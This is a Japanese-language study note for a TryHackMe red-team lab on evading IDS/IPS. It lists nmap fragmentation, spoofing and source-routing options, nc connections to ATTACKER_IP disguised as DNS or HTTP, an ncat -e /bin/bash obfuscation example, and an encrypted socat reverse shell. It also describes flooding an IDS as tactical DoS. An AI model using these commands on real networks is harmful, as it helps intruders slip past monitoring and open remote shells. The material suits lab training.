# IDS-IPS 回避

https://tryhackme.com/r/room/redteamnetsec

## プロトコル操作

### プロトコルを変える

#### nc で UDP を使う

```shell
nc -ulvnp PORT_NUM

nc -u TARGET_IP PORT_NUM
```

### ポートを変える

#### nmap

```shell
# HTTPパケットに見せかける
nmap -sS -Pn -g 80 -F 10.10.25.242

# DNSパケットに見せかける
nmap -sU -Pn -g 53 -F 10.10.25.242
```

#### nc

```shell
# DNSに偽装
nc -ulvnp 53
nc -u ATTACKER_IP 53

# HTTPに偽装
nc -lvnp 80
nc ATTACKER_IP 80
```

### セッションスプライシング（IP パケットの断片化）

#### nmap

```text
Nmap パケットを断片化するためのオプション。

-f パケット内のデータを 8 バイトに
-ff パケット内のデータを最大 16 バイトに
--mtu SIZEIP カスタムサイズを指定。8 の倍数。
```

#### fragroute

特定のホストに送信するパケットサイズを全てフラグメント化する

https://www.monkey.org/~dugsong/fragroute/

### 無効なパケット

```text
nmap のオプション

--badsum 間違ったチェックサム

--scanflags SYNRSTFIN カスタムフラグ
```

## ペイロード操作

### 難読化

```shell
base64
urlencode ncat -lvnp 1234 -e /bin/bash
```

CyberChef で、エスケープされた Unicode

### 暗号化

```shell
# キーを作成
openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt

cat thm-reverse.key thm-reverse.crt > thm-reverse.pem

# リッスン
socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT

# 接続
socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash
```

## ルート操作

### ソースルーティング

パケットが指定の IP を経由する nmap オプション

```shell
# ルーズ
--ip-options "L 10.10.10.50 10.10.50.250"

# 厳密（全てのホップを設定する必要がある）
--ip-options "S 10.10.10.1 10.10.20.2 10.10.30.3"
```

### プロキシ

経由するプロキシサーバーを設定

```shell
# HTTPプロキシホスト１と、SOCK4プロキシホスト２を経由
nmap -sS HTTP://PROXY_HOST1:8080,SOCKS4://PROXY_HOST2:4153 10.10.25.242
```

## 戦術的 DoS

- IDS / IPS の処理能力を単純に過負荷にする大量の無害なトラフィックを作成する。
- 大量の悪意のないトラフィックを作成するが、それらはログに記録される。このアクションにより、ログ サーバーとの通信チャネルが混雑したり、ディスク書き込み容量を超えたりする可能性がある。
